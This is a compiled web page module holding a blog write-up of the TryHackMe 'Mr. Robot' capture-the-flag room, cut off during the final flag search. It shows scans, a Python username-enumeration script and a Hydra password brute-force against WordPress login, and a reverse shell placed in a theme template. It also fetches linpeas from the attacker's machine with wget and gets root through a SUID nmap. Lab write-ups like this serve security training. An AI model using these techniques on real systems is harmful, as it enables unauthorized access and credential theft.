import { c as create_ssr_component } from "./ssr.js";
const metadata = {
  "title": "Mr. Robot",
  "description": "Based on the Mr. Robot show, can you root this box?",
  "author": "tryhackme",
  "date": "2023-05-09",
  "published": true
};
const Mr_robot = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  return `<h1 data-svelte-h="svelte-hqzt4n">mr robot</h1> <p data-svelte-h="svelte-11n9nmt"><a href="https://tryhackme.com/room/mrrobot" rel="nofollow">challenge page</a></p> <h2 data-svelte-h="svelte-19xpn4b">enumeration</h2> <p data-svelte-h="svelte-1q0svz7">We can start by running some enumeration on open ports with <code>nmap</code>:</p> <blockquote data-svelte-h="svelte-lvcwde"><p><code>nmap -sC -sV nmap-init 10.10.190.225 -vv</code>:</p></blockquote> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">PORT    STATE  SERVICE  REASON         VERSION
<span class="token number">22</span>/tcp  closed <span class="token function">ssh</span>      reset ttl <span class="token number">61</span>
<span class="token number">80</span>/tcp  <span class="token function">open</span>   http     syn-ack ttl <span class="token number">61</span> Apache httpd
<span class="token operator">|</span>_http-title: Site doesn<span class="token punctuation"></span>'t have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span> http-methods:
<span class="token operator">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="token operator">|</span>_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
<span class="token operator">|</span>_http-server-header: Apache
<span class="token number">443</span>/tcp <span class="token function">open</span>   ssl/http syn-ack ttl <span class="token number">61</span> Apache httpd
<span class="token operator">|</span>_http-title: <span class="token number">400</span> Bad Request
<span class="token operator">|</span> http-methods:
<span class="token operator">|</span>_  Supported Methods: GET HEAD POST
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>www.example.com
<span class="token operator">|</span> Issuer: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>www.example.com
<span class="token operator">|</span> Public Key type: rsa
<span class="token operator">|</span> Public Key bits: <span class="token number">1024</span>
<span class="token operator">|</span> Signature Algorithm: sha1WithRSAEncryption
<span class="token operator">|</span> Not valid before: <span class="token number">2015</span>-09-16T10:45:03
<span class="token operator">|</span> Not valid after:  <span class="token number">2025</span>-09-13T10:45:03
<span class="token operator">|</span> MD5:   3c16 3b19 87c3 42ad <span class="token number">6634</span> c1c9 d0aa fb97
<span class="token operator">|</span> SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
<span class="token operator">|</span> -----BEGIN CERTIFICATE-----
<span class="token operator">|</span> MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
<span class="token operator">|</span> d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
<span class="token operator">|</span> MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
<span class="token operator">|</span> MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
<span class="token operator">|</span> sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
<span class="token operator">|</span> yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
<span class="token operator">|</span> KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
<span class="token operator">|</span> 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
<span class="token operator">|</span> ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0<span class="token operator">=</span>
<span class="token operator">|</span>_-----END CERTIFICATE-----
<span class="token operator">|</span>_http-server-header: Apache</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1v6310">We can also enumerate directories with a wordlist while investigating the HTTP service in a browser.</p> <blockquote data-svelte-h="svelte-10j7q0p"><p><code>gobuster dir -u http://10.10.190.225/ -w ../../../tools/dirlists/directory-list-2.3-medium.txt -x html,js,css,txt,php -t 20 --retry</code></p></blockquote> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">    /<span class="token comment">#....</span>
    /.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">214</span><span class="token punctuation">]</span>
    /index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1188</span><span class="token punctuation">]</span>
    /images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">236</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/ima
    /index.php            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/<span class="token punctuation">]</span>
    /blog                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">234</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/blo
    /rss                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/feed/
    /sitemap              <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span>
    /login                <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/wp-lo
    /0                    <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/0/<span class="token punctuation">]</span>
    /feed                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/feed/
    /video                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">235</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/vid
    /image                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/image
    /atom                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/feed/
    /wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">240</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/wp-
    /admin                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">235</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/adm
    /audio                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">235</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/aud
    /intro                <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">516314</span><span class="token punctuation">]</span>
    /wp-login             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2671</span><span class="token punctuation">]</span>
    /wp-login.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2671</span><span class="token punctuation">]</span>
    /css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">233</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/css
    /rss2                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/feed/
    /license              <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">309</span><span class="token punctuation">]</span>
    /license.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">309</span><span class="token punctuation">]</span>
    /wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">241</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/wp-
    /js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">232</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/js/<span class="token punctuation">]</span>
    /wp-register.php      <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/wp-login.php?action<span class="token operator">=</span>register<span class="token punctuation">]</span>
    /Image                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://10.10.190.225/Image/<span class="token punctuation">]</span>
    /robots               <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /robots.txt<span class="token punctuation">]</span>
    /xmlrpc.php           <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span>
    /<span class="token comment">#...</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-jlpmu5">Generally speaking, the root directory doesn’t contain anything interesting.</p> <p data-svelte-h="svelte-1duxnwn">Instead, we can turn to our <code>gobuster</code> scan, where we see a <code>robots.txt</code> and directories for a Wordpress CMS backend. The <code>robots.txt</code> gives us the filepath for our first flag (<code>http://10.10.190.225/key-1-of-3.txt</code>), and a filepath for <code>fsocity.dic</code>; which is a long list of words. This turns out to be a list we can use to use to enumerate logins.</p> <p data-svelte-h="svelte-2tzeg5">On <code>/wp-login.php</code>, we are able to check existing users through the “Lost your password?” link - entering an incorrect username will inform us that the username is incorrect.
turning back to our <code>fsocity.dic</code>, i noted that there were a lot of duplicate entries; if i wanted to use this list to perform enumeration, it would make it much quicker to cut this down to unique entries only.
This is really easy to do in python by converting the contents of the file to a set, which cannot contain duplicate entries:</p> <pre class="language-python"><!-- HTML_TAG_START -->${`<code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"fsocity.dic"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
unique_lines <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"fsociety_uniquelines.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> unique_lines<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-xhfb1r">This shrunk it considerably - from 858,160 entries down to 11,451 entries. Using burp, we see that a POST request with a non-existant username gives a div with <code>id=&#39;login_error&#39;</code>, which we can use to invalidate a username:</p> <pre class="language-html"><!-- HTML_TAG_START -->${`<code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>ERROR<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>: Invalid username or e-mail.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code>`}<!-- HTML_TAG_END --></pre> <h2 data-svelte-h="svelte-1uysgjr">foothold</h2> <p data-svelte-h="svelte-1hphwpr">Using this information as well as the headers from this request, I wrote a (kind of janky) python script using pwntools that will query the login page, using the filtered <code>fsociety.dic</code> as a wordlist:</p> <pre class="language-python"><!-- HTML_TAG_START -->${`<code class="language-python"><span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> os
<span class="token keyword">import</span> logging

logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'pwnlib'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>CRITICAL<span class="token punctuation">)</span>
devnull <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>devnull<span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_RDWR<span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>devnull<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>

print_lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
count_lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">checkname</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> total_requests
    <span class="token keyword">global</span> invalid_responses
    <span class="token keyword">global</span> possible_hits
    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'10.10.190.225'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'POST /wp-login.php?action=lostpassword HTTP/1.1&#92;r&#92;n'</span>
            <span class="token string">'Host: Host: 10.10.190.225&#92;r&#92;n'</span>
            <span class="token string">'Content-Type: application/x-www-form-urlencoded&#92;r&#92;n'</span>
            <span class="token string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36&#92;r&#92;n'</span>
            <span class="token string">'Cookie: wordpress_test_cookie=WP+Cookie+check&#92;r&#92;n'</span>
            <span class="token string">'Content-Length: &#123;&#125;&#92;r&#92;n&#92;r&#92;n'</span>
            <span class="token string">'user_login=&#123;&#125;&amp;redirect_to=&amp;wp-submit=Get+New+Password&#92;r&#92;n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> count_lock<span class="token punctuation">:</span>
        total_requests <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> total_requests <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> print_lock<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Total requests:'</span><span class="token punctuation">,</span> total_requests<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Invalid responses:'</span><span class="token punctuation">,</span> invalid_responses<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'currently with '</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>possible_hits<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'possible usernames'</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> r<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token string">b'login_error'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        <span class="token keyword">with</span> print_lock<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'possible hit --> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string"> '</span></span><span class="token punctuation">)</span>
            possible_hits<span class="token punctuation">.</span>append<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> count_lock<span class="token punctuation">:</span>
            invalid_responses <span class="token operator">+=</span> <span class="token number">1</span>
    r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

total_requests <span class="token operator">=</span> <span class="token number">0</span>
invalid_responses <span class="token operator">=</span> <span class="token number">0</span>
possible_hits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fsociety_uniquelines.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    usernames <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">]</span>
<span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    executor<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>checkname<span class="token punctuation">,</span> usernames<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'completed with </span><span class="token interpolation"><span class="token punctuation">&#123;</span>total_requests<span class="token punctuation">&#125;</span></span><span class="token string"> total requests, and </span><span class="token interpolation"><span class="token punctuation">&#123;</span>invalid_responses<span class="token punctuation">&#125;</span></span><span class="token string"> invalid username requests.'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'possible usernames: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>possible_hits<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-qy5bh9">This could also be done (far quicker and easier) using Hydra.</p> <p data-svelte-h="svelte-ymtxfg">Regardless, we get multiple hits for case variations on <code>elliot</code>, which likely means the login form is not case sensitive (if it was, we could add them to a file and iterate the file with hydra instead):</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">completed with <span class="token number">11451</span> total requests, and <span class="token number">11448</span> invalid username requests.
possible usernames: <span class="token punctuation">[</span><span class="token string">'ELLIOT'</span>, <span class="token string">'Elliot'</span>, <span class="token string">'elliot'</span><span class="token punctuation">]</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-xcue9l">Manually trying any of these users returns the following error:</p> <pre class="language-html"><!-- HTML_TAG_START -->${`<code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error-page<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The e-mail could not be sent.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
Possible reason: your host may have disabled the mail() function.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-6pexe0">This indicates that <code>elliot</code> is a valid username, and it seems like the form is case-insensensitive. We can now use Hydra to enumerate the password from the same file on the login page:</p> <p data-svelte-h="svelte-i7zm9a"><code>hydra -l elliot -P ./fsociety_uniquelines.txt 10.10.190.225 -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p> <p data-svelte-h="svelte-1skm3w3">The THM machines are sensitive to receiving loads of requests like this so I probably killed the box with the python script,but after enumerating with the above command, we get a hit on elliot’s password:</p> <pre class="language-undefined"><!-- HTML_TAG_START -->${`<code class="language-undefined">[80][http-post-form] host: 10.10.218.32   login: elliot   password: ER28-0652</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1weti2k">Logging into the dashboard and poking around, like most CMS challenges, we likely want to look for a way to get a reverse shell callback. We can’t upload files with a <code>.php</code> extension, but we can edit some of the
themes template pages, which seem to execute code, to include a reverse shell. The easiest way to do this is on the template’s 404 error page, so we can replace the existing code with a reverse shell and navigate to
a nonexistant page to get into the box.</p> <p data-svelte-h="svelte-rjdf1b">We see the sole <code>/home</code> dir user with, <code>robot</code>:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">daemon@linux:/home$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Nov <span class="token number">13</span>  <span class="token number">2015</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">22</span> root root <span class="token number">4096</span> Sep <span class="token number">16</span>  <span class="token number">2015</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Nov <span class="token number">13</span>  <span class="token number">2015</span> robot</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1o54ca">We have <code>r-x</code> perms over this directory and thus can move into it. Here, there are two files:</p> <ul data-svelte-h="svelte-14zfiw"><li><code>key-2-of-3.txt</code></li> <li><code>password.raw-md5</code></li></ul> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">daemon@linux:/home/robot$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">16</span>
drwxr-xr-x <span class="token number">2</span> root  root  <span class="token number">4096</span> Nov <span class="token number">13</span>  <span class="token number">2015</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root  root  <span class="token number">4096</span> Nov <span class="token number">13</span>  <span class="token number">2015</span> <span class="token punctuation">..</span>
-r-------- <span class="token number">1</span> robot robot   <span class="token number">33</span> Nov <span class="token number">13</span>  <span class="token number">2015</span> key-2-of-3.txt
-rw-r--r-- <span class="token number">1</span> robot robot   <span class="token number">39</span> Nov <span class="token number">13</span>  <span class="token number">2015</span> password.raw-md5</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1qtxlkh">We can’t do anything with the flag file (<code>key-2-of-3.txt</code>) on account of permissions, but the <code>password.raw-md5</code> is probably just as interesting; I ultimately decided to give linpeas a quick go before coming back
to this with <code>hashcat</code>.</p> <p data-svelte-h="svelte-18fmzi6">I <code>wget -o</code> the <code>linpeas</code> script down from my host machine, mark it as executable, and run it:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">daemon@linux:/home/robot$ <span class="token builtin class-name">cd</span> /dev/shm
<span class="token builtin class-name">cd</span> /dev/shm
daemon@linux:/dev/shm$ <span class="token function">wget</span> -o- linpeas.sh http://10.4.23.161:4444/linpeas.sh
<span class="token function">wget</span> -o- linpeas.sh http://10.4.23.161:4444/linpeas.sh</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-snuvfi">Going over the results, we quickly see the <code>suid</code> bit is set on the <code>nmap</code> binary:</p> <pre class="language-sh"><!-- HTML_TAG_START -->${`<code class="language-sh">-rwsr-xr-x <span class="token number">1</span> root root 493K Nov <span class="token number">13</span>  <span class="token number">2015</span> /usr/local/bin/nmap</code>`}<!-- HTML_TAG_END --></pre> <h2 data-svelte-h="svelte-1ekbyxg">privesc</h2> <p data-svelte-h="svelte-1mnx9ll">Taking a quick look at <a href="https://gtfobins.github.io/gtfobins/nmap/#suid" rel="nofollow">the nmap page on gtfobins</a>, we see that <code>nmap</code> versions <code>2.02</code> to <code>5.21</code> have an interactive mode, and can be used to execute shell commands:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">nmap <span class="token parameter variable">--interactive</span>
nmap<span class="token operator">></span> <span class="token operator">!</span>sh</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-cedk5l">The vulnerable <code>nmap</code> binary is not on system or user <code>PATH</code>, so we’ll just navigate to it and check its version:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">daemon@linux:/dev/shm$ nmap
nmap
bash: nmap: <span class="token builtin class-name">command</span> not found
daemon@linux:/dev/shm$ <span class="token builtin class-name">cd</span> /usr/local/bin
<span class="token builtin class-name">cd</span> /usr/local/bin
daemon@linux:/usr/local/bin$ ./nmap <span class="token parameter variable">--version</span>
./nmap <span class="token parameter variable">--version</span>

nmap version <span class="token number">3.81</span> <span class="token punctuation">(</span> http://www.insecure.org/nmap/ <span class="token punctuation">)</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-mluji2">Our binary is in the <code>--interactive</code> version range, so lets give the <code>nmap</code> jailbreak a go:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">daemon@linux:/usr/local/bin$ ./nmap <span class="token parameter variable">--interactive</span>
./nmap <span class="token parameter variable">--interactive</span>

Starting nmap V. <span class="token number">3.81</span> <span class="token punctuation">(</span> http://www.insecure.org/nmap/ <span class="token punctuation">)</span>
Welcome to Interactive Mode -- press h <span class="token operator">&lt;</span>enter<span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin class-name">help</span>
nmap<span class="token operator">></span> <span class="token operator">!</span>sh
<span class="token function">whoami</span>
root</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1m4a7is">And now we can navigate back to the flag (no hash cracking required):</p> <pre class="language-undefined"><!-- HTML_TAG_START -->${`<code class="language-undefined">cd home
cd robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1qs3ux6">I assume that MD5 hash might’ve also contained a clue as to the whereabouts of the final flag, but considering we are currently <code>root</code>, we can just run <code>find</code> from the root dir:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/
<span class="token function">find</span> <span class="token parameter variable">-type</span> f <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"key-3-of-3.txt"</span>
find: <span class="token variable"><span class="token variable">&#96;</span>./proc/23622/task/23622/fd/8': No such <span class="token function">file</span> or directory
